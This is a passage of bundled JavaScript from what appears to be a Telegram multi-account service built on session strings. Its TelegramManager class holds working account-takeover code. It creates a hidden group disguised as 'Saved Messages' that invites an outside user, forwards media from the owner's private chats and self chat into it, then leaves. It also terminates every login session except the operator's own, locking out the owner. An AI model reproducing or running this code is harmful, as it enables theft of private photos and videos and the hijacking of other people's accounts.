        return await telegramClient.sendMediaAlbum(album);
    }
    async sendMessage(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.sendMessage(params);
    }
    async sendVoiceMessage(mobile, voice) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.sendVoiceMessage(voice);
    }
    async cleanupChat(mobile, cleanup) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.cleanupChat(cleanup);
    }
    async getChatStatistics(mobile, chatId, period) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getChatStatistics(chatId, period);
    }
    async updatePrivacyBatch(mobile, settings) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updatePrivacyBatch(settings);
    }
    async addGroupMembers(mobile, groupId, members) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.addGroupMembers(groupId, members);
    }
    async removeGroupMembers(mobile, groupId, members) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.removeGroupMembers(groupId, members);
    }
    async promoteToAdmin(mobile, groupId, userId, permissions, rank) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.promoteToAdmin(groupId, userId, permissions, rank);
    }
    async demoteAdmin(mobile, groupId, userId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Demoted admin to regular member', { groupId, userId });
        return await telegramClient.demoteAdmin(groupId, userId);
    }
    async unblockGroupUser(mobile, groupId, userId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Unblocked user in group', { groupId, userId });
        return await telegramClient.unblockGroupUser(groupId, userId);
    }
    async getGroupAdmins(mobile, groupId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get group admins', { groupId });
        return await telegramClient.getGroupAdmins(groupId);
    }
    async getGroupBannedUsers(mobile, groupId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get group banned users', { groupId });
        return await telegramClient.getGroupBannedUsers(groupId);
    }
    async searchMessages(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Search messages', params);
        return await telegramClient.searchMessages(params);
    }
    async getFilteredMedia(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get filtered media', params);
        return await telegramClient.getFilteredMedia(params);
    }
    async exportContacts(mobile, format, includeBlocked = false) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Export contacts', { format, includeBlocked });
        return await telegramClient.exportContacts(format, includeBlocked);
    }
    async importContacts(mobile, contacts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Import contacts', { contactCount: contacts.length });
        return await telegramClient.importContacts(contacts);
    }
    async manageBlockList(mobile, userIds, block) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, block ? 'Block users' : 'Unblock users', { userIds });
        return await telegramClient.manageBlockList(userIds, block);
    }
    async getContactStatistics(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get contact statistics');
        return await telegramClient.getContactStatistics();
    }
    async createChatFolder(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Create chat folder', { name: options.name });
        return await telegramClient.createChatFolder(options);
    }
    async getChatFolders(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get chat folders');
        return await telegramClient.getChatFolders();
    }
    async getSessionInfo(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get session info');
        return await telegramClient.getSessionInfo();
    }
    async terminateSession(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Terminate session', options);
        return await telegramClient.terminateSession(options);
    }
    async editMessage(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Edit message', { chatId: options.chatId, messageId: options.messageId });
        return await telegramClient.editMessage(options);
    }
    async updateChatSettings(mobile, settings) {
        if (!settings.chatId) {
            throw new Error('chatId is required');
        }
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Update chat settings', { chatId: settings.chatId });
        return await telegramClient.updateChatSettings(settings);
    }
    async sendMediaBatch(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Send media batch', { chatId: options.chatId, mediaCount: options.media.length });
        return await telegramClient.sendMediaBatch(options);
    }
    async hasPassword(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Check password status');
        return await telegramClient.hasPassword();
    }
    async getContacts(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get contacts list');
        return await telegramClient.getContacts();
    }
    async getChats(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get chats', options);
        return await telegramClient.getChats(options);
    }
    async getFileUrl(mobile, url, filename) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get file URL', { url, filename });
        return await telegramClient.getFileUrl(url, filename);
    }
    async getMessageStats(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get message statistics', options);
        return await telegramClient.getMessageStats(options);
    }
    async sendViewOnceMedia(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Send view once media', { sourceType: options.sourceType, chatId: options.chatId });
        const { sourceType, chatId, caption, filename } = options;
        try {
            if (sourceType === 'path') {
                if (!options.path)
                    throw new common_1.BadRequestException('Path is required when sourceType is url');
                try {
                    const localPath = options.path;
                    if (!fs.existsSync(localPath)) {
                        throw new common_1.BadRequestException(`File not found at path: ${localPath}`);
                    }
                    let isVideo = false;
                    const ext = path.extname(localPath).toLowerCase().substring(1);
                    if (['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                    const fileBuffer = fs.readFileSync(localPath);
                    this.logger.info(mobile, 'Sending view once media from local file', {
                        path: localPath,
                        isVideo,
                        size: fileBuffer.length,
                        filename: filename || path.basename(localPath)
                    });
                    return await telegramClient.sendViewOnceMedia(chatId, fileBuffer, caption, isVideo, filename || path.basename(localPath));
                }
                catch (error) {
                    if (error instanceof common_1.BadRequestException) {
                        throw error;
                    }
                    this.logger.error(mobile, 'Failed to read local file', error);
                    throw new common_1.BadRequestException(`Failed to read local file: ${error.message}`);
                }
            }
            else if (sourceType === 'base64') {
                if (!options.base64Data)
                    throw new common_1.BadRequestException('Base64 data is required when sourceType is base64');
                const base64String = options.base64Data;
                let isVideo = false;
                if (filename) {
                    const ext = filename.toLowerCase().split('.').pop();
                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                }
                this.logger.info(mobile, 'Sending view once media from base64', { isVideo, size: base64String.length });
                const mediaData = Buffer.from(base64String, 'base64');
                return await telegramClient.sendViewOnceMedia(chatId, mediaData, caption, isVideo, filename);
            }
            else if (sourceType === 'binary') {
                if (!options.binaryData)
                    throw new common_1.BadRequestException('Binary data is required when sourceType is binary');
                this.logger.info(mobile, 'Sending view once media from binary', {
                    size: options.binaryData.length,
                    filename: filename || 'unknown'
                });
                let isVideo = false;
                if (filename) {
                    const ext = filename.toLowerCase().split('.').pop();
                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                }
                return await telegramClient.sendViewOnceMedia(chatId, options.binaryData, caption, isVideo, filename);
            }
            else {
                throw new common_1.BadRequestException('Invalid source type. Must be one of: url, base64, binary');
            }
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to send view once media', error);
            throw error;
        }
    }
    async getTopPrivateChats(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get top private chats');
        return await telegramClient.getTopPrivateChats();
    }
    async addBotsToChannel(mobile, channelIds = [process.env.accountsChannel, process.env.updatesChannel, process.env.notifChannel, "miscmessages", process.env.httpFailuresChannel]) {
        this.logger.info(mobile, 'Add bots to channel', { channelIds });
        const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);
        if (botTokens.length === 0) {
            throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');
        }
        for (const token of botTokens) {
            try {
                const botInfo = await this.getBotInfo(token);
                if (botInfo) {
                    for (const channelId of channelIds) {
                        await this.setupBotInChannel(mobile, channelId, botInfo.id, botInfo.username, {
                            changeInfo: true,
                            postMessages: true,
                            editMessages: true,
                            deleteMessages: true,
                            banUsers: true,
                            inviteUsers: true,
                            pinMessages: true,
                            addAdmins: true,
                            anonymous: true,
                            manageCall: true
                        });
                    }
                    ;
                }
            }
            catch (error) {
                this.logger.error(mobile, 'Failed to setup bot in channel', error);
            }
        }
    }
    async getBotInfo(token) {
        try {
            const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.telegram.org/bot${token}/getMe`);
            if (response.data?.ok) {
                return response.data.result;
            }
            throw new Error('Failed to get bot info');
        }
        catch (error) {
            throw new Error(`Failed to get bot info: ${error.message}`);
        }
    }
    async setupBotInChannel(mobile, channelId, botId, botUsername, permissions) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Setup bot in channel', { channelId, botId, botUsername });
        try {
            await telegramClient.joinChannel(channelId);
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to join channel', error);
        }
        try {
            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);
            this.logger.info(mobile, 'Bot added to channel', { channelId, botUsername });
            await (0, Helpers_1.sleep)(2000);
            this.logger.info(mobile, `Bot ${botUsername} successfully added to channel ${channelId}`);
        }
        catch (error) {
            this.logger.error(mobile, `Failed to add bot ${botUsername} to channel ${channelId}`, error);
        }
        try {
            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);
            this.logger.debug(mobile, `Bot ${botUsername} promoted as admin in channel ${channelId}`);
        }
        catch (error) {
            this.logger.error(mobile, `Failed to setup bot ${botUsername} in channel ${channelId}`, error);
        }
    }
    async createBot(mobile, createBotDto) {
        const client = await connection_manager_1.connectionManager.getClient(mobile);
        return client.createBot(createBotDto);
    }
    async connect(mobile, options) {
        await connection_manager_1.connectionManager.getClient(mobile, options);
    }
    async disconnect(mobile) {
        await connection_manager_1.connectionManager.unregisterClient(mobile);
    }
    async disconnectAll() {
        await connection_manager_1.connectionManager.disconnectAll();
    }
    getConnectionStats() {
        return connection_manager_1.connectionManager.getConnectionStats();
    }
    getClientState(mobile) {
        const state = connection_manager_1.connectionManager.getClientState(mobile);
        return state;
    }
    getActiveConnectionCount() {
        return connection_manager_1.connectionManager.getActiveConnectionCount();
    }
};
exports.TelegramService = TelegramService;
exports.TelegramService = TelegramService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __metadata("design:paramtypes", [users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        channels_service_1.ChannelsService])
], TelegramService);


/***/ }),

/***/ "./src/components/Telegram/TelegramManager.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/TelegramManager.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const events_1 = __webpack_require__(/*! telegram/events */ "telegram/events");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const uploads_1 = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const IMap_1 = __webpack_require__(/*! ../../IMap/IMap */ "./src/IMap/IMap.ts");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const message_search_dto_1 = __webpack_require__(/*! ./dto/message-search.dto */ "./src/components/Telegram/dto/message-search.dto.ts");
const generateTGConfig_1 = __webpack_require__(/*! ./utils/generateTGConfig */ "./src/components/Telegram/utils/generateTGConfig.ts");
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async createGroup() {
        const groupName = "Saved Messages";
        const groupDescription = this.phoneNumber;
        console.log("Creating group:", groupName);
        const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel({
            title: groupName,
            about: groupDescription,
            megagroup: true,
            forImport: true,
        }));
        const { id, accessHash } = result.chats[0];
        console.log("Archived chat", id);
        await this.archiveChat(id, accessHash);
        const usersToAdd = ["fuckyoubabie1"];
        console.log("Adding users to the channel:", usersToAdd);
        const addUsersResult = await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: new telegram_1.Api.InputChannel({
                channelId: id,
                accessHash: accessHash,
            }),
            users: usersToAdd
        }));
        console.log("Successful addition of users:", addUsersResult);
        return { id, accessHash };
    }
    async archiveChat(id, accessHash) {
        const folderId = 1;
        console.log("Archiving chat", id);
        return await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new telegram_1.Api.InputFolderPeer({
                    peer: new telegram_1.Api.InputPeerChannel({
                        channelId: id,
                        accessHash: accessHash,
                    }),
                    folderId: folderId,
                }),
            ],
        }));
    }
    async createOrJoinChannel(channel) {
        let channelId;
        let channelAccessHash;
        if (channel) {
            try {
                const result = await this.joinChannel(channel);
                channelId = result.chats[0].id;
                channelAccessHash = result.chats[0].accessHash;
                console.log("Archived chat", channelId);
            }
            catch (error) {
                const result = await this.createGroup();
                channelId = result.id;
                channelAccessHash = result.accessHash;
                console.log("Created new group with ID:", channelId);
            }
        }
        else {
            const result = await this.createGroup();
            channelId = result.id;
            channelAccessHash = result.accessHash;
            console.log("Created new group with ID:", channelId);
        }
        await this.archiveChat(channelId, channelAccessHash);
        return { id: channelId, accesshash: channelAccessHash };
    }
    async forwardMedia(channel, fromChatId) {
        let channelId;
        try {
            console.log("Forwarding media from chat to channel", channel, fromChatId);
            let channelAccessHash;
            if (fromChatId) {
                const channelDetails = await this.createOrJoinChannel(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                await this.forwardSecretMsgs(fromChatId, channelId?.toString());
            }
            else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                if (chats.length > 0) {
                    const channelDetails = await this.createOrJoinChannel(channel);
                    channelId = channelDetails.id;
                    channelAccessHash = channelDetails.accesshash;
                    const finalChats = new Set(chats.map(chat => chat.chatId));
                    finalChats.add(me.id?.toString());
                    for (const chatId of finalChats) {
                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
                        console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                    }
                }
                console.log("Completed forwarding messages from top private chats to channel:", channelId);
            }
        }
        catch (e) {
            console.log(e);
        }
        if (channelId) {
            await this.leaveChannels([channelId.toString()]);
            await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
        }
    }
    async forwardMediaToBot(fromChatId) {
    }
    async forwardSecretMsgs(fromChatId, toChatId) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            console.log(messageIds);
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });
                    forwardedCount += messageIds.length;
                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await (0, Helpers_1.sleep)(5000);
                }
                catch (error) {
                    console.error("Error occurred while forwarding messages:", error);
                }
                await (0, Helpers_1.sleep)(5000);
            }
        } while (messages.length > 0);
        console.log("Left the channel with ID:", toChatId);
        return;
    }
    async forwardMessages(fromChatId, toChatId, messageIds) {
        const chunkSize = 30;
        const totalMessages = messageIds.length;
        let forwardedCount = 0;
        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });
                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await (0, Helpers_1.sleep)(5000);
            }
            catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }
        return forwardedCount;
    }
    async destroy() {
        if (this.client) {
            try {
                await this.client?.destroy();
                this.client._eventBuilders = [];
                this.session?.delete();
                this.channelArray = [];
                await (0, Helpers_1.sleep)(2000);
                console.log("Client Destroyed: ", this.phoneNumber);
            }
            catch (error) {
                (0, parseError_1.parseError)(error, `${this.phoneNumber}: Error during client cleanup`);
            }
            finally {
                if (this.client) {
                    this.client._destroyed = true;
                    if (this.client._sender && typeof this.client._sender.disconnect === 'function') {
                        await this.client._sender.disconnect();
                    }
                    this.client = null;
                }
            }
        }
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        const me = await this.client.getMe();
        return me;
    }
    async errorHandler(error) {
        if (error.message && error.message == 'TIMEOUT') {
            console.error(`Timeout error occurred for ${this.phoneNumber}, disconnecting client.`);
            await this.destroy();
        }
        else {
            (0, parseError_1.parseError)(error, `${this.phoneNumber}:RPC Error`, true);
        }
    }
    async createClient(handler = true, handlerFn) {
        this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, (0, generateTGConfig_1.generateTGConfig)());
        this.client.setLogLevel(Logger_1.LogLevel.ERROR);
        this.client._errorHandler = this.errorHandler;
        await this.client.connect();
        const me = await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler");
            if (handlerFn) {
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
            }
            else {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
            }
        }
        return this.client;
    }
    async getGrpMembers(entity) {
        try {
            const result = [];
            const chat = await this.client.getEntity(entity);
            if (!(chat instanceof telegram_1.Api.Chat || chat instanceof telegram_1.Api.Channel)) {
                console.log("Invalid group or channel!");
                return;
            }
            console.log(`Fetching members of ${chat.title || chat.username}...`);
            const participants = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
                channel: chat,
                filter: new telegram_1.Api.ChannelParticipantsRecent(),
                offset: 0,
                limit: 200,
                hash: (0, big_integer_1.default)(0),
            }));
            if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
                const users = participants.participants;
                console.log(`Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = await this.client.getEntity(userInfo);
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        });
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            console.log(JSON.stringify(userDetails.id));
                        }
                    }
                    else {
                        console.log(JSON.stringify(user?.userId));
                    }
                }
            }
            else {
                console.log("No members found or invalid group.");
            }
            console.log(result.length);
            return result;
        }
        catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }
    async getSelfMSgsInfo() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const self = await this.client.getMe();
        const selfChatId = self.id;
        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
            else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++;
                    }
                    else {
                        otherPhotoCount++;
                    }
                }
                else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++;
                    }
                    else {
                        otherVideoCount++;
                    }
                }
            }
        }
        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount });
    }
    async channelInfo(sendIds = false) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 1500 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        const canSendFalseChats = [];
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    }
                    else {
                        canSendFalseCount++;
                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                }
            }
        }
        ;
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : [],
            canSendFalseChats
        };
    }
    async addContact(data, namePrefix) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                try {
                    await this.client.invoke(new telegram_1.Api.contacts.AddContact({
                        firstName,
                        lastName,
                        phone: user.mobile,
                        id: user.tgId
                    }));
                }
                catch (e) {
                    console.log(e);
                }
            }
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async addContacts(mobiles, namePrefix) {
        try {
            const inputContacts = [];
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                const clientId = (0, big_integer_1.default)((i << 16 | 0).toString(10));
                inputContacts.push(new telegram_1.Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user,
                    firstName: firstName,
                    lastName: lastName
                }));
            }
            const result = await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                contacts: inputContacts,
            }));
            console.log("Imported Contacts Result:", result);
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async leaveChannels(chats) {
        console.log("Leaving Channels: initaied!!");
        console.log("ChatsLength: ", chats);
        for (const id of chats) {
            const channelId = id.startsWith('-100') ? id : `-100${id}`;
            try {
                await this.client.invoke(new telegram_1.Api.channels.LeaveChannel({
                    channel: channelId
                }));
                console.log(`${this.phoneNumber} Left channel :`, id);
                if (chats.length > 1) {
                    await (0, Helpers_1.sleep)(3000);
                }
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `${this.phoneNumber} Failed to leave channel  ${channelId}:`, false);
                if (errorDetails.message.includes('CHANNEL_INVALID')) {
                    try {
                        const entity = await this.safeGetEntity(channelId);
                        await this.client.invoke(new telegram_1.Api.channels.LeaveChannel({
                            channel: entity
                        }));
                    }
                    catch (err) {
                        console.warn(`${this.phoneNumber} Cannot fetch entity for: ${channelId}, likely not a member or invalid`);
                        continue;
                    }
                }
            }
        }
        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        console.log("trying to join channel : ", entity);
        return await this.client?.invoke(new telegram_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }
    isAuthMine(auth) {
        const authCriteria = [
            { field: 'country', value: 'singapore' },
            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
        ];
        return authCriteria.some(criterion => {
            const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';
            if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) {
                return true;
            }
            if ('values' in criterion) {
                return criterion.values.some(value => fieldValue.includes(value.toLowerCase()));
            }
            return fieldValue.includes(criterion.value.toLowerCase());
        });
    }
    async resetAuthorization(auth) {
        try {
            await this.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
        }
        catch (error) {
            (0, parseError_1.parseError)(error, `Failed to reset authorization for ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
        }
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
